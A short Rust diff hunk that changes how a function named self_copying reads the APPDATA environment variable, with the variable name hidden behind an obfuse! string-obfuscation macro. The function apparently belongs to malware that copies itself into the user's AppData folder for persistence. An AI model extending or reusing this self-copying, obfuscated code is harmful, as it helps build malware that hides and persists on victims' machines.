@@ -10,7 +10,7 @@ pub fn self_copying() -> std::io::Result<()> {
     let obfused_appdata = obfuse!("APPDATA");
     let appdata_str = obfused_appdata.as_str();
 
-    let mut dest_path = if let Ok(appdata) = env::var(&appdata_str) {
+    let mut dest_path = if let Ok(appdata) = env::var(appdata_str) {
         println!("[INFO] Using AD directory: {}", appdata);
         PathBuf::from(appdata)
     } else {
